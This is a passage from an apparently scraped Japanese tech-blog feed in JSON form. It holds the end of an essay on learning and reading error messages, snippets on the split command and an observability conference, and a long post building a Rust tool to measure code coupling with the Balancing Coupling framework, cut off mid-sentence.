再読、すでに動くコードの微調整、すぐに答えを探すこと。これらは確かに楽だが長期的な学習効果は低い。なぜか。脳は情報を取り出すのに苦労すること自体でその情報への神経経路を強化するからだ。簡単すぎる復習ではこの「取り出す苦労」が発生せず記憶が強化されない。効果的な方法は少し忘れかけたタイミングで復習すること。概念を学び1日空けて何も見ずに説明しようとし思い出せない部分を確認する。難しく忘れかけていて思い出すのに苦労するがこの苦労こそが記憶を強化する。新しい概念を学ぶとき混乱は不快で「もう無理だ」と思う。でもこの不快感こそが成長の証なのだ。脳が新しい構造を構築しようとしている証で既存の理解の枠組みが崩れ新しい理解が生まれつつある証だ。この不快な状態を抱えたまま学び続け逃げずに向き合う。ある日突然繋がる。その瞬間の爽快感はすべての苦労を報いてくれる。「快適ならやり方が間違っている」という言葉がある。本当の成長は常にコンフォートゾーンの外側で起きる。最後にエラーメッセージをちゃんと読み仮説を一つずつ潰し主語と述語を把握する。こうした小さなこと。ワークショップの最後にある学生が「エラーメッセージちゃんと読んだらちゃんと書いてありました」と言った。当たり前のことだがこの当たり前のことができていない人は驚くほど多い。めんどくさいと感じるかもしれないがこの「めんどくさい」基礎作業を飛ばすから結果的に何倍も時間がかかってしまう。才能があるように見える人はこれらを実践しているだけで意識的か無意識的に。これらは訓練可能だ。小さく始める。不完全でも動く。その積み重ねだけだ。エンジニアという仕事には一つの大きな救いがある。それは手を動かしている間才能への不安が消えるということだ。「自分には才能がない」という悩みは頭の中でぐるぐる回り始めるとどんどん大きくなるが「これを作りたい」と思って実装を始めた瞬間その悩みはどこかに消える。目の前にあるのは具体的な問題だけだ。エラーが出て調べて解決してまた詰まってまた調べる。この「詰まる→調べる→解決する」のサイクルを回すこと自体が静かに自信を育てていく。理解の速さには個人差がありこれは残酷な現実だが、人生という長い時間軸で見たときこの速さの差は思ったほど大きくない。むしろ一歩ずつでも前に進み続けた人と途中で立ち止まってしまった人の差の方がはるかに大きい。時間は誰にも平等だ。その時間を「理解できない問題の前での空回り」に使うか「今理解できることから順に積み上げていく前進」に使うか。この選択が長期的には想像もできないほどの差を生む。ぐちゃぐちゃ考える暇があったら手を動かす。才能について悩む時間を1行でも多くコードを書く時間に変え、理想の自分について考える時間を作りたいものを作る時間に変える。その積み重ねが気づけば「成長」と呼ばれるものになっている。心理的安全性　最強の教科書作者:ピョートル・フェリクス・グジバチ東洋経済新報社Amazonおわりにワークショップで出会った学生の一人が最近こんなメッセージを送ってきた。「ちゃんと読むようになったら解決が早くなりました」。彼は以前「才能がない」と言っていたが実際にはエラーメッセージを読み飛ばしていただけだった。その事実を言語化し意識的に「ちゃんと読む」ようにした。それだけで解決速度は変わった。些細なことだがその些細なことに気づくまで私は何年もかかった。このポストで繰り返し述べてきたように動けない理由は言葉にしてしまえば驚くほど小さい。恥を恐れていて完璧を求めすぎていて「なんか不安」を「なんか」のまま放置していて、そして「才能がない」という誰も反論できない理由で全てから逃げていた。言葉にした瞬間それらは「対処可能な課題」に変わる。でも言葉にするまでが驚くほど難しい。なぜなら嫌な自分と向き合わなければならないから。ワークショップを三年続けて一つ確信したことがある。最初は速かったのに途中で離れていった人たちがいて最初は遅かったのに黙々と続けている人たちがいる。三年後後者の方が圧倒的に前に進んでいる。「才能」という言葉を使った瞬間思考は停止する。でも「エラーメッセージを読み飛ばしている」と言語化した瞬間「じゃあちゃんと読めばいい」という対策が見える。そのシンプルな事実に気づくかどうか。それだけの差が長い時間をかけて想像もできないほど大きな差になる。syu-m-5151.hatenablog.com未熟な自分がワークショップを始めて三年。今でも不安はあり「自分なんかが教えていいのか」と思うこともある。でも若手と一緒に作業する中で気づいた。彼らが必要としているのは全てを知り尽くした完璧な指導者ではない。「才能」という便利な言葉で可能性を閉ざさず「じゃあどうすればいいか」を一緒に考える誰かだ。そしてそれは自分自身に対しても同じだと思っている。「読んでいる自分は頑張っている気がする」という謎の達成感に私たちはいつまで浸っているのだろうか。本当に必要なのは手を動かすこと。小さく完璧でなくてもでも確実に前に進むこと。言葉にしない限り「なんか」は永遠に巨大な壁であり続けるが、言葉にしてしまえば思ったより大したことなかったりする。その一歩を踏み出すかどうか。結局それだけの話だ。","isoDate":"2025-11-01T03:00:27.000Z","dateMiliSeconds":1761966027000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"splitコマンドでファイルを分割する方法について","link":"https://zenn.dev/akasan/articles/a7d35ab880e1f8","contentSnippet":"今回はファイルを分割するためのsplitコマンドについて調べてみました。行数が多いファイルを分割する方法を調べていたら組み込みのコマンドとして存在していたので調べてみました。 splitコマンドの使い方それでは早速splitコマンドを使ってみます。 検証用データの作成今回はテストように100万行あるデータを作成してみました。Pythonでパパッと作りました。with open(\\"original.txt\\", \\"w\\") as f:    for i in range(1_000_000):        f.write(f\\"{i}\\\\n\\")これを実行すると、0から99,9...","isoDate":"2025-10-31T12:47:15.000Z","dateMiliSeconds":1761914835000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Observability Conference Tokyo 2025に参加してきました！","link":"https://sreake.com/blog/o11y-con-tokyo-2025/","contentSnippet":"はじめに 3-shakeで マーケティング・ブランディングを行なっている永瀬です。 2025/10/27に Observability Conference Tokyo 2025 が開催されましてスリーシェイクもスポンサ […]The post Observability Conference Tokyo 2025に参加してきました！ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-10-31T09:21:45.000Z","dateMiliSeconds":1761902505000,"authorName":"Sreake","authorId":"Sreake"},{"title":"近すぎず、遠すぎず - コードの結合度とちょうどいい距離の測り方","link":"https://syu-m-5151.hatenablog.com/entry/2025/10/31/125256","contentSnippet":"はじめに人間関係が数値化できればなぁって思ったこともありますか？僕はあります。「この人とは、ちょうどいい距離感だな」とか、「もうちょっと親しくなりたいけど、近づきすぎると息苦しいかもしれない」とか。そういう、言葉にしづらい感覚を、もし数字で表せたら——なんて。コードを書いているとき、似たようなことを考える。「このモジュールとあのモジュール、近すぎるな」と思う瞬間がある。あるいは逆に、「これ、もっと近くにあった方がいいんじゃないか」と。モジュール同士の距離感。誰もが一度は悩んだことがあるはずだ。近すぎても、遠すぎてもいけない。でも、「ちょうどいい」って、どういうことだろう。バグを修正したときのことだ。直接的には関係ないはずの、別の場所が壊れる。そんな経験、ないだろうか。それは、見えない糸が張り巡らされている証拠だ。データの持ち方への暗黙の依存。前提条件。実行順序。そういう、目に見えにくい結合が、コードのあちこちに潜んでいる。大切なのは、結合をゼロにすることじゃない。そんなことは、できない。むしろ、適切にバランスさせることだ。人間関係と同じように。Vlad Khononov が書いた「Balancing Coupling in Software Design」という本がある。この本は、結合度を測るための、実践的なフレームワークを提供している。結合の強さ、距離、そして変更の頻度——この3つの軸。これで測る。バランスを評価する。この本が教えてくれることがある。機能は線形に増える。でも、複雑さは指数関数的に膨れ上がる。そして、僕たち人間には認知的な限界がある。だから、複雑さに対処するには、システムの形を変えるしかない。そのための道具が、結合なのだ。この記事では、その概念を Rust プロジェクトに適用してみる。実際に測定して、分析できるツールを作る。コードの「ちょうどいい距離感」を数値化し、可視化する。そんな試みである。Balancing Couplingの核心概念ソフトウェア設計の結合バランス　持続可能な成長を支えるモジュール化の原則 (impress top gearシリーズ)作者:Vlad KhononovインプレスAmazon3つの次元で結合度を測るすごく端的に話すとKhononov のフレームワークは、結合度を 3 つの軸で評価する。1. Integration Strength（統合強度）コンポーネント間で共有される知識の量。次の 4 つのレベルに分類される。Intrusive Coupling（侵入的結合）- 内部実装の詳細に依存Functional Coupling（機能的結合）- 共有された責任による依存Model Coupling（モデル結合）- ビジネスドメインモデルの共有Contract Coupling（契約結合）- インターフェース/トレイトによる抽象化下に行くほど結合が弱く、望ましい。2. Distance（距離）依存関係がどれだけ離れているかを測る。同じ関数内同じモジュール内異なるモジュール異なるクレート異なるサービス（マイクロサービスの場合）距離が遠いほど、変更のコストが高くなる。3. Volatility（変動性）コンポーネントの変更頻度を示す。Core Subdomain（コアサブドメイン）- 高頻度で変更Supporting Subdomain（サポートサブドメイン）- 中程度の変更Generic Subdomain（汎用サブドメイン）- 低頻度の変更バランスの公式これらを組み合わせた「バランスの方程式」は、概念的には次のように表現できる。BALANCE = (STRENGTH XOR DISTANCE) OR NOT VOLATILITY概念の解釈MODULARITY = STRENGTH XOR DISTANCE強い結合なら距離を近く（局所性を保つ）弱い結合なら距離を遠くても良い（疎結合）この 2 つのパターンが理想的BALANCE = MODULARITY OR NOT VOLATILITYモジュラーである、または変動性が低い（安定している）どちらかの条件を満たせばバランスが取れている数値計算への変換実装では、論理演算を数値計算に変換する。XOR - 両極端（強\xd7近、弱\xd7遠）の和として計算OR - 最大値（max）として計算NOT - 補数（1.0 - x）として計算ここで押さえておきたいのは、結合をゼロにするのが目的ではないということ。適切にバランスさせることが肝心で、コンテキストに応じて最適な形を選ぶ必要がある。Connascence（共依存性）結合度をさらに細かく分析するには、Meilir Page-Jones が提唱した「Connascence」の概念が役立つ。Static Connascence（静的共依存性）コンパイル時に検出可能なもの。Connascence of Name（CoN）- 名前への依存Connascence of Type（CoT）- 型への依存Connascence of Meaning（CoM）- 値の意味への依存Connascence of Position（CoP）- パラメータ順序への依存Connascence of Algorithm（CoA）- アルゴリズムへの依存Dynamic Connascence（動的共依存性）実行時に検出されるもの。Connascence of Execution（CoE）- 実行順序への依存Connascence of Timing（CoT）- タイミングへの依存Connascence of Value（CoV）- 値の同期的変更への依存Connascence of Identity（CoI）- 同一インスタンスへの依存動的共依存性は、最も弱いものでも、最も強い静的共依存性よりも強い結合を意味する。Rustにおける既存ツール1. cargo-modulesモジュール構造と依存関係を可視化できる。https://crates.io/crates/cargo-modulescrates.ioインストール:cargo install cargo-modules使い方:# モジュール構造をツリー表示cargo modules structure# モジュール間の依存関係をグラフ表示cargo modules dependencies# 循環依存の検出cargo modules dependencies --acyclic# 孤立したファイルの検出cargo modules orphans特徴:モジュール階層の視覚化循環依存の検出（リファクタリングの重要な手がかり）未使用ファイルの発見GraphViz と連携可能2. rust-code-analysisMozilla が開発した、多言語対応のコードメトリクス計測ツール。github.comインストール:cargo install rust-code-analysis-cli使い方:# 単一ファイルの分析rust-code-analysis-cli --metrics -p src/main.rs# プロジェクト全体の分析rust-code-analysis-cli --metrics -p ./src# JSON形式で出力rust-code-analysis-cli --metrics -O json -o metrics.json -p ./src計測可能なメトリクスCC (Cyclomatic Complexity) - 循環的複雑度COGNITIVE - 認知的複雑度HALSTEAD - Halstead メトリクス（Bugs, Difficulty, Effort, Volume 等）LOC 系 - SLOC、PLOC、LLOC 等NOM - メソッド数NARGS - 引数の数NEXITS - 出口の数WMC - クラスごとの循環的複雑度の合計Rust コードの複雑度を他言語と比較する研究でも使用されており、信頼性が高い。3. cargo treeCargo 組み込みの依存関係ツリー表示コマンド。doc.rust-lang.org使い方:# 依存関係ツリーの表示cargo tree# 深さを制限cargo tree --depth 1# 特定のパッケージを除外cargo tree --prune serde# 重複する依存関係を表示cargo tree --duplicates# リバース依存関係（何がこのクレートに依存しているか）cargo tree --invert <package-name>4. その他の有用なツールcargo-deps - GraphViz DOT ファイルを生成cargo-depgraph - 視覚的な依存関係グラフtokei - コード統計（行数、言語別集計）cargo-deny - 依存関係のポリシー検証Balanced Couplingを測定するカスタムツールの実装既存ツールは有用だが、Khononov のモデルを直接適用するには限界がある。特に、Integration Strength の分類、Dynamic Connascence の検出、Git 履歴との連携、Balance Score の計算といった機能が不足している。これらを測定するため、カスタムツールを実装していこう。基本的なアプローチ必要な依存関係を Cargo.toml に追加します。[dependencies]syn = { version = \\"2.0\\", features = [\\"full\\", \\"visit\\"] }quote = \\"1.0\\"walkdir = \\"2.4\\"thiserror = \\"2.0\\"実装例です。use syn::{visit::Visit, ItemFn, ItemImpl};/// 結合度メトリクスを保持する構造体////// Integration Strength、Distance、Connascenceの3つの次元を測定#[derive(Debug, Default, Clone)]pub struct CouplingMetrics {    // Integration Strength    pub intrusive_count: usize,    pub functional_count: usize,    pub model_count: usize,    pub contract_count: usize,    // Distance    pub same_module: usize,    pub cross_module: usize,    pub cross_crate: usize,    // Connascence    pub name_coupling: Vec<String>,    pub type_coupling: Vec<String>,    pub position_coupling: Vec<String>,}/// ASTを訪問して結合度を分析するアナライザー#[derive(Debug)]pub struct CouplingAnalyzer {    pub metrics: CouplingMetrics,    pub current_module: String,}impl CouplingAnalyzer {    /// 新しいアナライザーを作成    ///    /// # Arguments    /// * `module_name` - 分析対象のモジュール名    fn new(module_name: String) -> Self {        Self {            metrics: CouplingMetrics::default(),            current_module: module_name,        }    }    /// 関数シグネチャを分析してConnascence of Positionを検出    ///    /// # Arguments    /// * `sig` - 分析対象の関数シグネチャ    fn analyze_function_signature(&mut self, sig: &syn::Signature) {        // 引数の数をチェック（Connascence of Position）        if sig.inputs.len() > 3 {            self.metrics.position_coupling.push(                format!(\\"Function {} has {} parameters\\",                    sig.ident, sig.inputs.len())            );        }    }    /// 2つのモジュールパス間の距離を計算    ///    /// # Arguments    /// * `from_path` - 開始パス (例: \\"crate::module::submodule\\")    /// * `to_path` - 終了パス    ///    /// # Returns    /// モジュール階層における段数（距離）    fn calculate_distance(&self, from_path: &str, to_path: &str) -> usize {        let from_parts: Vec<&str> = from_path.split(\\"::\\").collect();        let to_parts: Vec<&str> = to_path.split(\\"::\\").collect();        // 共通の祖先を見つける        let common = from_parts.iter()            .zip(to_parts.iter())            .take_while(|(a, b)| a == b)            .count();        (from_parts.len() - common) + (to_parts.len() - common)    }}impl<\'ast> Visit<\'ast> for CouplingAnalyzer {    /// 関数定義を訪問    fn visit_item_fn(&mut self, node: &\'ast ItemFn) {        // 関数定義を分析        self.analyze_function_signature(&node.sig);        syn::visit::visit_item_fn(self, node);    }    /// implブロックを訪問してContract/Intrusive Couplingを検出    fn visit_item_impl(&mut self, node: &\'ast ItemImpl) {        // トレイト実装を分析（Contract Coupling）        if node.trait_.is_some() {            self.metrics.contract_count += 1;        } else {            // 具象型への直接実装（Intrusive Coupling）            self.metrics.intrusive_count += 1;        }        syn::visit::visit_item_impl(self, node);    }}Volatility（変動性）の測定Git の履歴から変更頻度を分析します。use std::process::Command;use std::collections::HashMap;use thiserror::Error;/// Volatility分析のエラー型#[derive(Error, Debug)]pub enum VolatilityError {    #[error(\\"Git command failed: {0}\\")]    GitCommandFailed(String),    #[error(\\"Failed to parse Git output: {0}\\")]    ParseError(String),    #[error(\\"IO error: {0}\\")]    Io(#[from] std::io::Error),    #[error(\\"UTF-8 conversion error: {0}\\")]    Utf8Error(#[from] std::string::FromUtf8Error),}/// ファイルの変更頻度を分析するアナライザー////// Git履歴を解析して各ファイルの変動性を評価#[derive(Debug, Default, Clone)]pub struct VolatilityAnalyzer {    file_changes: HashMap<String, usize>,}/// 変動性のレベル#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]pub enum VolatilityLevel {    /// 低変動性（汎用サブドメイン）    Low,    /// 中変動性（サポートサブドメイン）    Medium,    /// 高変動性（コアサブドメイン）    High,}impl VolatilityAnalyzer {    /// 新しいアナライザーを作成    fn new() -> Self {        Self::default()    }    /// Git履歴を解析して変更頻度を収集    ///    /// # Arguments    /// * `months` - 過去何ヶ月分の履歴を分析するか    ///    /// # Returns    /// 成功時は `Ok(())`、Git コマンド実行失敗時はエラー    ///    /// # Errors    /// - Git コマンドが失敗した場合    /// - 出力のパースに失敗した場合    ///    /// # Example    /// ```    /// let mut analyzer = VolatilityAnalyzer::new();    /// analyzer.analyze_git_history(6)?; // 過去6ヶ月を分析    /// ```    pub fn analyze_git_history(&mut self, months: usize) -> Result<(), VolatilityError> {        let output = Command::new(\\"git\\")            .args([                \\"log\\",                \\"--pretty=format:\\",                \\"--name-only\\",                &format!(\\"--since={} months ago\\", months)            ])            .output()?;        // Git コマンドが失敗した場合のチェック        if !output.status.success() {            let stderr = String::from_utf8_lossy(&output.stderr);            return Err(VolatilityError::GitCommandFailed(stderr.to_string()));        }        let files = String::from_utf8(output.stdout)?;        for file in files.lines().filter(|l| !l.is_empty()) {            *self.file_changes.entry(file.to_string())                .or_insert(0) += 1;        }        Ok(())    }    /// ファイルの変動性レベルを分類    ///    /// # Arguments    /// * `file` - 分類対象のファイルパス    ///    /// # Returns    /// 変動性レベル（Low/Medium/High）    fn classify_volatility(&self, file: &str) -> VolatilityLevel {        let changes = self.file_changes.get(file).copied().unwrap_or(0);        match changes {            0..=2 => VolatilityLevel::Low,            3..=10 => VolatilityLevel::Medium,            _ => VolatilityLevel::High,        }    }    /// 最も変更頻度の高いファイルを取得    ///    /// # Arguments    /// * `n` - 取得する上位ファイル数    ///    /// # Returns    /// (ファイルパス, 変更回数) のタプルのベクター    fn top_volatile_files(&self, n: usize) -> Vec<(&str, usize)> {        let mut files: Vec<_> = self.file_changes            .iter()            .map(|(file, &count)| (file.as_str(), count))            .collect();        files.sort_by(|a, b| b.1.cmp(&a.1));        files.truncate(n);        files    }}バランススコアの計算/// Balancing Couplingのスコアを計算////// Khononovのモデルに基づき、Strength、Distance、Volatilityの/// 3次元からバランススコアを算出#[derive(Debug, Clone)]struct BalancedCouplingScore {    /// 結合の強さ: 0.0 (弱い) から 1.0 (強い)    strength: f64,    /// 距離: 0.0 (近い) から 1.0 (遠い)    distance: f64,    /// 変動性: 0.0 (安定) から 1.0 (頻繁に変更)    volatility: f64,}impl BalancedCouplingScore {    /// 新しいスコアを作成    ///    /// # Arguments    /// * `strength` - 結合の強さ (0.0-1.0)    /// * `distance` - 距離 (0.0-1.0)    /// * `volatility` - 変動性 (0.0-1.0)    ///    /// # Panics    /// 各値が 0.0-1.0 の範囲外の場合にパニック    fn new(strength: f64, distance: f64, volatility: f64) -> Self {        assert!((0.0..=1.0).contains(&strength), \\"strength must be 0.0-1.0\\");        assert!((0.0..=1.0).contains(&distance), \\"distance must be 0.0-1.0\\");        assert!((0.0..=1.0).contains(&volatility), \\"volatility must be 0.0-1.0\\");        Self {            strength,            distance,            volatility,        }    }    /// モジュラリティを計算    ///    /// # Formula    /// MODULARITY = STRENGTH XOR DISTANCE (論理的な意味での排他的論理和)    ///    /// 理想的な状態：    /// - 強い結合なら距離が近い (strength が高く distance が低い)    /// - 弱い結合なら距離が遠くても良い (strength が低く distance が高い)    ///    /// # Returns    /// モジュラリティスコア (0.0-1.0、高いほど良い)    fn calculate_modularity(&self) -> f64 {        // 強い結合 \xd7 近い距離 = 良い（局所性が高い）        let ideal_close = self.strength * (1.0 - self.distance);        // 弱い結合 \xd7 遠い距離 = 良い（疎結合が保たれている）        let ideal_far = (1.0 - self.strength) * self.distance;        ideal_close + ideal_far    }    /// バランススコアを計算    ///    /// # Formula    /// BALANCE = MODULARITY OR (NOT VOLATILITY) (論理的な意味での論理和)    ///    /// バランスが取れている状態：    /// - モジュラーである、または    /// - 変動性が低い（安定している）    ///    /// # Returns    /// バランススコア (0.0-1.0、高いほど良い)    fn calculate_balance(&self) -> f64 {        let modularity = self.calculate_modularity();        let stability = 1.0 - self.volatility;        // 論理和の近似：max を使用        modularity.max(stability)    }    /// 結合の問題点を識別    ///    /// # Returns    /// 検出された問題のリスト    fn identify_issues(&self) -> Vec<CouplingIssue> {        let mut issues = Vec::new();        // パターン1: グローバル複雑性        // 強い結合 + 遠い距離 = 変更の調整コストが高い        if self.strength > 0.7 && self.distance > 0.7 {            issues.push(CouplingIssue {                severity: IssueSeverity::High,                description: \\"Strong coupling over long distance increases global complexity\\"                    .to_string(),                recommendation: \\"Consider moving coupled components closer or reducing coupling strength\\"                    .to_string(),            });        }        // パターン2: ローカル複雑性        // 弱い結合 + 近い距離 = 不要な抽象化の可能性        if self.strength < 0.3 && self.distance < 0.3 {            issues.push(CouplingIssue {                severity: IssueSeverity::Medium,                description: \\"Weak coupling at close distance may indicate unnecessary indirection\\"                    .to_string(),                recommendation: \\"Consider consolidating components or increasing distance\\"                    .to_string(),            });        }        // パターン3: カスケード変更リスク        // 強い結合 + 高変動性 = 変更が広範囲に波及        if self.strength > 0.7 && self.volatility > 0.7 {            issues.push(CouplingIssue {                severity: IssueSeverity::Critical,                description: \\"Strong coupling with volatile component creates cascading change risk\\"                    .to_string(),                recommendation: \\"Isolate volatile components or reduce coupling strength\\"                    .to_string(),            });        }        // パターン4: 低モジュラリティ        let modularity = self.calculate_modularity();        if modularity < 0.4 {            issues.push(CouplingIssue {                severity: IssueSeverity::Medium,                description: format!(\\"Low modularity score: {:.2}\\", modularity),                recommendation: \\"Review coupling strength and distance relationship\\"                    .to_string(),            });        }        issues    }}/// 結合に関する問題#[derive(Debug, Clone)]struct CouplingIssue {    severity: IssueSeverity,    description: String,    recommendation: String,}/// 問題の重要度#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]enum IssueSeverity {    Low,    Medium,    High,    Critical,}実践的な使用例プロジェクト全体の分析必要な依存関係を追加します。[dependencies]syn = { version = \\"2.0\\", features = [\\"full\\", \\"visit\\"] }walkdir = \\"2.4\\"実装例です。use walkdir::WalkDir;use std::path::Path;use std::ffi::OsStr;use std::fs;/// プロジェクト全体のメトリクスを保持#[derive(Debug, Default)]struct ProjectMetrics {    measurements: Vec<CouplingMeasurement>,    file_count: usize,    module_count: usize,}/// 結合度の測定結果#[derive(Debug)]struct CouplingMeasurement {    from_module: String,    to_module: String,    strength: f64,    distance: f64,    volatility: f64,}/// プロジェクト全体を分析////// # Arguments/// * `project_path` - プロジェクトのルートパス////// # Returns/// プロジェクトメトリクス、またはエラー////// # Example/// ```/// let metrics = analyze_project(\\"./src\\")?;/// println!(\\"Total files analyzed: {}\\", metrics.file_count);/// ```fn analyze_project(project_path: &str) -> Result<ProjectMetrics, Box<dyn std::error::Error>> {    let mut project_metrics = ProjectMetrics::default();    // 1. 構造的な依存関係を分析    for entry in WalkDir::new(project_path)        .follow_links(true)        .into_iter()        .filter_map(|e| e.ok())    {        let path = entry.path();        // Rustファイルのみを処理        if path.extension() == Some(OsStr::new(\\"rs\\")) {            analyze_rust_file(path, &mut project_metrics)?;        }    }    // 2. Git履歴から変動性を分析    let mut volatility = VolatilityAnalyzer::new();    volatility.analyze_git_history(6)?;    // 3. バランススコアを計算    calculate_balance_scores(&mut project_metrics, &volatility);    Ok(project_metrics)}/// 個別のRustファイルを分析////// # Arguments/// * `path` - ファイルパス/// * `project_metrics` - プロジェクトメトリクスの可変参照fn analyze_rust_file(    path: &Path,    project_metrics: &mut ProjectMetrics,) -> Result<(), Box<dyn std::error::Error>> {    let content = fs::read_to_string(path)?;    let syntax = syn::parse_file(&content)?;    let module_name = path        .to_string_lossy()        .replace(\'/\', \\"::\\")        .replace(\\".rs\\", \\"\\");    let mut analyzer = CouplingAnalyzer::new(module_name);    analyzer.visit_file(&syntax);    project_metrics.file_count += 1;    project_metrics.module_count += 1;    Ok(())}/// バランススコアを計算してプロジェクトメトリクスに追加////// # Arguments/// * `metrics` - プロジェクトメトリクスの可変参照/// * `volatility` - 変動性アナライザーの参照fn calculate_balance_scores(    metrics: &mut ProjectMetrics,    volatility: &VolatilityAnalyzer,) {    for measurement in &metrics.measurements {        let score = BalancedCouplingScore::new(            measurement.strength,            measurement.distance,            measurement.volatility,        );        let issues = score.identify_issues();        if !issues.is_empty() {            eprintln!(                \\"Issues found in coupling from {} to {}:\\",                measurement.from_module, measurement.to_module            );            for issue in issues {                eprintln!(\\"  [{:?}] {}\\", issue.severity, issue.description);            }        }    }}レポート生成use std::io::{self, Write};/// Markdownフォーマットでレポートを生成////// # Arguments/// * `metrics` - プロジェクトメトリクス/// * `writer` - 出力先 (stdout、ファイルなど)////// # Example/// ```/// let metrics = analyze_project(\\"./src\\")?;/// generate_report(&metrics, &mut std::io::stdout())?;/// ```fn generate_report<W: Write>(    metrics: &ProjectMetrics,    writer: &mut W,) -> io::Result<()> {    writeln!(writer, \\"# Coupling Analysis Report\\\\n\\")?;    // サマリーセクション    write_summary(metrics, writer)?;    // 統合強度の分布    write_strength_distribution(metrics, writer)?;    // 問題の検出    write_issues(metrics, writer)?;    // 変動性分析    write_volatility_analysis(metrics, writer)?;    Ok(())}/// サマリーセクションを出力fn write_summary<W: Write>(    metrics: &ProjectMetrics,    writer: &mut W,) -> io::Result<()> {    writeln!(writer, \\"## Summary\\\\n\\")?;    writeln!(writer, \\"- **Total Files**: {}\\", metrics.file_count)?;    writeln!(writer, \\"- **Total Modules**: {}\\", metrics.module_count)?;    writeln!(        writer,        \\"- **Total Couplings**: {}\\\\n\\",        metrics.measurements.len()    )?;    Ok(())}/// Integration Strengthの分布を出力fn write_strength_distribution<W: Write>(    metrics: &ProjectMetrics,    writer: &mut W,) -> io::Result<()> {    writeln!(writer, \\"## Integration Strength Distribution\\\\n\\")?;    let total = metrics.measurements.len() as f64;    let contract = metrics        .measurements        .iter()        .filter(|m| m.strength <= 0.25)        .count();    let model = metrics        .measurements        .iter()        .filter(|m| m.strength > 0.25 && m.strength <= 0.50)        .count();    let functional = metrics        .measurements        .iter()        .filter(|m| m.strength > 0.50 && m.strength <= 0.75)        .count();    let intrusive = metrics        .measurements        .iter()        .filter(|m| m.strength > 0.75)        .count();    writeln!(        writer,        \\"- **Contract Coupling** (weakest): {} ({:.1}%)\\",        contract,        (contract as f64 / total) * 100.0    )?;    writeln!(        writer,        \\"- **Model Coupling**: {} ({:.1}%)\\",        model,        (model as f64 / total) * 100.0    )?;    writeln!(        writer,        \\"- **Functional Coupling**: {} ({:.1}%)\\",        functional,        (functional as f64 / total) * 100.0    )?;    writeln!(        writer,        \\"- **Intrusive Coupling** (strongest): {} ({:.1}%)\\\\n\\",        intrusive,        (intrusive as f64 / total) * 100.0    )?;    Ok(())}/// 検出された問題を出力fn write_issues<W: Write>(    metrics: &ProjectMetrics,    writer: &mut W,) -> io::Result<()> {    writeln!(writer, \\"## Detected Issues\\\\n\\")?;    let mut has_issues = false;    for measurement in &metrics.measurements {        let score = BalancedCouplingScore::new(            measurement.strength,            measurement.distance,            measurement.volatility,        );        let issues = score.identify_issues();        if !issues.is_empty() {            has_issues = true;            writeln!(                writer,                \\"### {} → {}\\\\n\\",                measurement.from_module, measurement.to_module            )?;            for issue in issues {                writeln!(writer, \\"**{:?}**: {}\\", issue.severity, issue.description)?;                writeln!(writer, \\"- *Recommendation*: {}\\\\n\\", issue.recommendation)?;            }        }    }    if !has_issues {        writeln!(writer, \\"No significant coupling issues detected.\\\\n\\")?;    }    Ok(())}/// 変動性分析を出力fn write_volatility_analysis<W: Write>(    metrics: &ProjectMetrics,    writer: &mut W,) -> io::Result<()> {    writeln!(writer, \\"## High Volatility Analysis\\\\n\\")?;    // 高変動性のファイルを抽出    let high_volatility: Vec<_> = metrics        .measurements        .iter()        .filter(|m| m.volatility > 0.7)        .collect();    if high_volatility.is_empty() {        writeln!(writer, \\"No high volatility modules detected.\\\\n\\")?;    } else {        writeln!(writer, \\"Modules with high change frequency:\\\\n\\")?;        for measurement in high_volatility {            writeln!(                writer,                \\"- `{}` (volatility: {:.2})\\",                measurement.from_module, measurement.volatility            )?;        }        writeln!(writer)?;    }    Ok(())}実践的なガイドライン結合度を改善するためのパターン1. 強い結合が必要な場合は距離を近くする頻繁に一緒に変更される機能は、同じモジュール内に配置するべきだ。// Good: 密接に関連する機能を同じモジュールに配置mod user_profile {    pub struct User { /* ... */ }    pub struct UserProfile { /* ... */ }    // Userと常に一緒に使われる    impl User {        pub fn get_profile(&self) -> &UserProfile { /* ... */ }    }}DDD 的に言えば、同じ Bounded Context 内の概念は同じモジュールに配置する。2. 弱い結合なら距離を遠くしても良いインターフェース（trait）を通じた疎結合なら、別クレートに分けても問題ない。// core/src/lib.rs - インターフェース定義pub trait NotificationService {    fn send(&self, message: &str) -> Result<(), Error>;}// adapters/email/src/lib.rs - 実装は別クレートuse core::NotificationService;pub struct EmailService;impl NotificationService for EmailService {    fn send(&self, message: &str) -> Result<(), Error> { /* ... */ }}3. 高変動性のコードは低結合に保つビジネスロジック（Core Subdomain）は頻繁に変更される。他への影響を最小化するため、低結合に保つ必要がある。// Strategy Patternで変動性を隔離pub trait PricingStrategy {    fn calculate(&self, base_price: f64) -> f64;}pub struct StandardPricing;impl PricingStrategy for StandardPricing {    fn calculate(&self, base_price: f64) -> f64 {        base_price // ビジネスルールの変更がここに限定される    }}pub struct Order {    pricing: Box<dyn PricingStrategy>, // Dependency Injection}4. Connascenceを意識したリファクタリングパターン1: Position → Name// Before: Connascence of Position（悪い例）fn create_user(name: String, email: String, age: u32, country: String) -> User {    // 引数の順序に依存}// After: Connascence of Name（良い例）struct UserBuilder {    name: String,    email: String,    age: u32,    country: String,}impl UserBuilder {    fn name(mut self, name: String) -> Self {        self.name = name;        self    }    // 他のフィールドも同様}パターン2: Meaning → Name// Before: Connascence of Meaning（悪い例）if status == 1 { /* active */ }else if status == 2 { /* inactive */ }// After: Connascence of Name（良い例）#[derive(Debug, Clone, Copy, PartialEq, Eq)]enum UserStatus {    Active,    Inactive,    Suspended,}if status == UserStatus::Active { /* ... */ }おわりにVlad Khononov の「Balancing Coupling」フレームワークが教えてくれるのは、単なる「強い/弱い」という二元論を超えた結合度の見方だ。結合の強さ、距離、変動性——この3つの軸で測定することで、より細かい粒度での分析が可能になる。この調査を通じて明らかになったのは、Rust エコシステムには部分的に役立つツールは存在するものの、Balancing Coupling の概念を完全に体現するツールはまだ存在しないということだった。cargo-modules、rust-code-analysis、cargo tree といった既存ツールは、それぞれが異なる視点からコードを照らし出してくれる。しかし、Integration Strength の分類、Dynamic Connascence の検出、変動性の分析、そしてバランススコアの計算——これらを統合的に扱うには、カスタム実装が必要だ。そこで、本記事で紹介した設計をベースに、実際に動作するツールを作成していく。 syn クレートによる AST 解析、Git 履歴からの変動性測定、そして Khononov 